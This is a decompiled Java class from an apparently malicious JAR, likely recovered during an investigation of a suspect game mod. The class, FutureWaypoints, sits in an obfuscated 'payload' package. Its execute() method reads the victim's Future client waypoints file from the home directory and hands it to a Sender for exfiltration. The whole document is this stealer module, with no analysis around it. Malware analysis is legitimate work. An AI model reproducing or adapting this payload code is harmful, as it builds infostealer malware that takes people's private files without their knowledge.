/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ import java.util.Optional;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class FutureWaypoints
/*    */   implements Payload
/*    */ {
/*    */   public void execute() {
/* 15 */     Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\waypoints.txt");
/* 16 */     file.ifPresent(Sender::send);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\FutureWaypoints.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */